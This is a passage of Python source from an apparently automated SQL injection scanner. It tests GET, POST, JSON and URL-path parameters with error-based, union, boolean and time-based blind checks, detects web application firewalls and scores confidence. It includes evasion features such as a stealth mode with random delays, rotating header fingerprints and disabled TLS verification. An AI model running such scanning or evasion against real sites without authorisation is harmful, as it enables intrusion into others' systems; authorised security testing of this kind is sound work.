            if self.circuit_breaker.is_dead(url):
                break

            test_url = self._inject_payload(url, param_name, sleep_payload)
            t0       = time.monotonic()
            response = self._get(test_url, extra_read=extra_read)
            elapsed  = time.monotonic() - t0

            sleep_triggered = False
            if response is None and elapsed >= threshold * 0.9:
                sleep_triggered = True
            elif response is not None and elapsed >= threshold:
                sleep_triggered = True

            if not sleep_triggered:
                continue

            if response is not None:
                waf = self._detect_waf(response)
                if waf:
                    result["evidence"].append(
                        f"WAF detected ({waf}): time-based latency may be firewall delay"
                    )
                    continue

            neutral_url      = self._inject_payload(url, param_name, neutral_payload)
            confirm_times:   List[float] = []
            confirm_failures = 0

            for _ in range(_TIMEBASED_CONFIRM):
                if self.circuit_breaker.is_dead(url):
                    break
                if _exit_requested or _skip_current:
                    break
                t_c       = time.monotonic()
                r_c       = self._get(neutral_url)
                elapsed_c = time.monotonic() - t_c

                if r_c is None:
                    confirm_failures += 1
                else:
                    confirm_times.append(elapsed_c)

                _interruptible_sleep(0.5)

            if confirm_failures > 0:
                continue
            if not confirm_times:
                continue

            confirm_avg       = sum(confirm_times) / len(confirm_times)
            confirm_threshold = baseline + _TIMEBASED_MARGIN

            if confirm_avg <= confirm_threshold:
                result["vulnerable"] = True
                result["confidence"] = SQLiConfidence.MEDIUM.value
                result["evidence"].append(
                    f"Time-based confirmed: SLEEP elapsed={elapsed:.1f}s  "
                    f"threshold={threshold:.1f}s  "
                    f"neutral avg={confirm_avg:.2f}s  "
                    f"baseline={baseline:.2f}s"
                )
                return result

        return result

    def test_sqli(self, url: str) -> Dict:
        """Run the full GET-parameter SQLi test suite on url; return a structured result dict."""
        result = {
            "url":                url,
            "vulnerable":         False,
            "overall_confidence": SQLiConfidence.NONE.value,
            "tests":              [],
            "tested":             False,
            "message":            "",
            "waf_detected":       None,
        }

        if not self.has_query_params(url):
            result["message"] = "No query parameters found"
            return result

        if self.circuit_breaker.is_dead(url):
            result["message"] = "Host unreachable (circuit breaker open)"
            return result

        result["tested"] = True
        params = self._extract_query_params(url)
        if not params:
            result["message"] = "No query parameters found"
            return result

        baseline = self._get_baseline_response(url)
        if baseline is None:
            result["message"] = "Could not establish baseline (host unreachable)"
            return result

        baseline_status, baseline_content, baseline_len = baseline

        _bl2 = self._get(url)
        if _bl2 is not None:
            waf_on_baseline = self._detect_waf(_bl2)
            if waf_on_baseline:
                result["waf_detected"] = waf_on_baseline
                result["message"] = (
                    f"WAF detected ({waf_on_baseline}) on baseline — "
                    f"results may have false negatives"
                )

        per_param_scores: List[int] = []

        for param_name in self._prioritize_params(params):

            if self.circuit_breaker.is_dead(url):
                result["message"] = "Host became unreachable during testing"
                break
            if _exit_requested or _skip_current:
                break
            if not self._probe_parameter(url, param_name, baseline_content):
                continue

            param_score = 0

            error_result = self._test_error_based(url, param_name)
            error_result["parameter"] = param_name
            result["tests"].append(error_result)

            if error_result.get("waf") and not result["waf_detected"]:
                result["waf_detected"] = error_result["waf"]

            if error_result["vulnerable"]:
                if error_result["confidence"] == SQLiConfidence.HIGH.value:
                    param_score += 3
                    result["vulnerable"]         = True
                    result["overall_confidence"] = SQLiConfidence.HIGH.value
                    result["message"]            = f"Tested {len(params)} parameter(s)"
                    return result
                else:
                    param_score += 2

            union_result = self._test_union_based(url, param_name, baseline_len)
            union_result["parameter"] = param_name
            result["tests"].append(union_result)

            if union_result.get("waf") and not result["waf_detected"]:
                result["waf_detected"] = union_result["waf"]

            if union_result["vulnerable"]:
                if union_result["confidence"] == SQLiConfidence.HIGH.value:
                    param_score += 3
                elif union_result["confidence"] == SQLiConfidence.MEDIUM.value:
                    param_score += 2
                else:
                    param_score += 1

            bool_result = self._test_boolean_blind(url, param_name, baseline_len)
            bool_result["parameter"] = param_name
            result["tests"].append(bool_result)
            if bool_result["vulnerable"]:
                param_score += 2

            time_result = self._test_time_based_blind(url, param_name)
            time_result["parameter"] = param_name
            result["tests"].append(time_result)
            if time_result.get("vulnerable", False):
                param_score += (
                    3 if time_result["confidence"] == SQLiConfidence.HIGH.value else 2
                )

            if param_score > 0:
                per_param_scores.append(param_score)

            if self.stealth:
                _interruptible_sleep(random.uniform(2, 4))

        if per_param_scores:
            best = max(per_param_scores)
            avg  = sum(per_param_scores) / len(per_param_scores)

            result["vulnerable"] = True

            if best >= 5:
                result["overall_confidence"] = SQLiConfidence.CRITICAL.value
            elif best >= 3 or avg >= 3:
                result["overall_confidence"] = SQLiConfidence.HIGH.value
            elif best >= 2 or avg >= 2:
                result["overall_confidence"] = SQLiConfidence.MEDIUM.value
            else:
                result["overall_confidence"] = SQLiConfidence.LOW.value

        result["message"] = f"Tested {len(params)} parameter(s)"
        return result

    def test_post_sqli(self, url: str, post_data: Dict[str, str]) -> Dict:
        """Test all POST parameters for SQL injection using error-based detection."""
        result = {
            "url": url, "vulnerable": False,
            "overall_confidence": SQLiConfidence.NONE.value,
            "tests": [], "tested": False, "message": "",
            "waf_detected": None,
        }
        if not post_data or self.circuit_breaker.is_dead(url):
            result["message"] = "No POST parameters or host unreachable"
            return result

        result["tested"]  = True
        baseline_resp     = self._get(url)
        if baseline_resp is None:
            result["message"] = "Could not establish baseline"
            return result

        waf = self._detect_waf(baseline_resp)
        if waf:
            result["waf_detected"] = waf

        confidence_scores = []

        for param_name in post_data.keys():
            if self.circuit_breaker.is_dead(url):
                break
            if _exit_requested or _skip_current:
                break

            payload_dict             = post_data.copy()
            payload_dict[param_name] = str(post_data[param_name]) + "'"

            self.fingerprint_rotator.get_random()
            _hdrs    = self.fingerprint_rotator.build_headers()
            _data    = payload_dict
            _timeout = self._timeout()

            def _do_post(_d=_data, _h=_hdrs, _t=_timeout):
                """Execute the POST request with the current payload dict inside the worker thread."""
                return self._session.post(
                    url,
                    data    = _d,
                    headers = _h,
                    timeout = _t,
                    verify  = False,
                )

            response = self._run_interruptible(
                _do_post,
                total_timeout    = _CONNECT_TIMEOUT + self.read_timeout,
                on_connect_error = lambda: self.circuit_breaker.mark_dead(url),
            )
            if response is None:
                if self.circuit_breaker.is_dead(url):
                    break
                continue

            waf = self._detect_waf(response)
            if waf:
                if not result["waf_detected"]:
                    result["waf_detected"] = waf
                continue

            match = self._match_sql_errors(response.text)
            if match:
                db_type, pattern = match
                result["vulnerable"] = True
                result["tests"].append({
                    "method":    "post_error_based",
                    "parameter": param_name,
                    "db":        db_type,
                    "evidence":  pattern[:60],
                })
                confidence_scores.append(3)

            if self.stealth:
                _interruptible_sleep(random.uniform(2, 4))

        if confidence_scores:
            avg = sum(confidence_scores) / len(confidence_scores)
            result["overall_confidence"] = (
                SQLiConfidence.HIGH.value if avg >= 3 else SQLiConfidence.MEDIUM.value
            )
            result["vulnerable"] = True

        result["message"] = f"Tested {len(post_data)} POST parameter(s)"
        return result

    def test_json_sqli(self, url: str, json_data: Dict[str, str]) -> Dict:
        """Test all JSON body parameters for SQL injection using error-based detection."""
        result = {
            "url": url, "vulnerable": False,
            "overall_confidence": SQLiConfidence.NONE.value,
            "tests": [], "tested": False, "message": "",
            "waf_detected": None,
        }
        if not json_data or self.circuit_breaker.is_dead(url):
            result["message"] = "No JSON parameters or host unreachable"
            return result

        result["tested"]  = True
        confidence_scores = []

        for key in json_data.keys():
            if self.circuit_breaker.is_dead(url):
                break
            if _exit_requested or _skip_current:
                break

            payload_dict      = json_data.copy()
            payload_dict[key] = str(payload_dict[key]) + "'"

            _json_data = payload_dict
            _timeout   = self._timeout()

            def _do_json_post(_j=_json_data, _t=_timeout):
                """Execute the JSON POST request inside the worker thread."""
                return self._session.post(
                    url,
                    json    = _j,
                    timeout = _t,
                    verify  = False,
                )

            response = self._run_interruptible(
                _do_json_post,
                total_timeout    = _CONNECT_TIMEOUT + self.read_timeout,
                on_connect_error = lambda: self.circuit_breaker.mark_dead(url),
            )
            if response is None:
                continue

            waf = self._detect_waf(response)
            if waf:
                if not result["waf_detected"]:
                    result["waf_detected"] = waf
                continue

            match = self._match_sql_errors(response.text)
            if match:
                db_type, pattern = match
                result["vulnerable"] = True
                result["tests"].append({
                    "method":    "json_error_based",
                    "parameter": key,
                    "db":        db_type,
                    "evidence":  pattern[:60],
                })
                confidence_scores.append(3)

            if self.stealth:
                _interruptible_sleep(random.uniform(2, 4))

        if confidence_scores:
            avg = sum(confidence_scores) / len(confidence_scores)
            result["overall_confidence"] = (
                SQLiConfidence.HIGH.value if avg >= 3 else SQLiConfidence.MEDIUM.value
            )
            result["vulnerable"] = True

        result["message"] = "JSON injection test completed"
        return result

    def test_path_based_sqli(self, url: str) -> Dict:
        """Test path-based SQL injection by appending a quote to numeric/word path segments."""
        result = {
            "method":     "path_based",
            "vulnerable": False,
            "confidence": SQLiConfidence.NONE.value,
            "evidence":   [],
        }
        if self.circuit_breaker.is_dead(url):
            return result

        path = urlparse(url).path
        if re.search(r"/\d+$", path) or re.search(r"/\w+$", path):
            response = self._get(url + "'")
            if response:
                waf = self._detect_waf(response)
                if waf:
                    result["evidence"].append(f"WAF detected ({waf}): path-based skipped")
                    return result

                match = self._match_sql_errors(response.text)
                if match:
                    db_type, pattern = match
                    result["vulnerable"] = True
                    result["confidence"] = SQLiConfidence.HIGH.value
                    result["evidence"].append(
                        f"Path-based SQLi: {db_type.upper()} — {pattern[:60]}"
                    )
        return result
